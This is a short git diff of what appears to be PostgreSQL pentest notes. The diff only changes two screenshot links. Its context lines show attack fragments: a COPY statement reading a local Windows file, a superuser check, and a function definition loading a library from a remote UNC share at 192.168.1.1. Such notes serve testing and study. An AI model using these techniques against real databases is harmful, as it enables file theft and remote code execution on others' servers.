@@ -97,7 +97,7 @@ CREATE temp table readdatatable (content text);COPY readdatatable from $$C:\User
 ```sql
 SELECT current_setting('is_superuser');
 ```
-![Pasted image 20210908125508.png](Screenshots/Pasted%20image%2020210908125508.png)
+![Pasted image 20210908125508.png](/Screenshots/Pasted%20image%2020210908125508.png)
 
 ### Extensions
 #### Load PostgreSQL Extension
@@ -111,7 +111,7 @@ create or replace function test(text, integer) returns void as $$\\192.168.1.1\s
 ```
 
 Need to make sure the appropriate Postgres structure is defined. Otherwise, this error will show up
-![Pasted image 20210908171828.png](Screenshots/Pasted%20image%2020210908171828.png)
+![Pasted image 20210908171828.png](/Screenshots/Pasted%20image%2020210908171828.png)
 
 #### Check if function exists
 ```sql
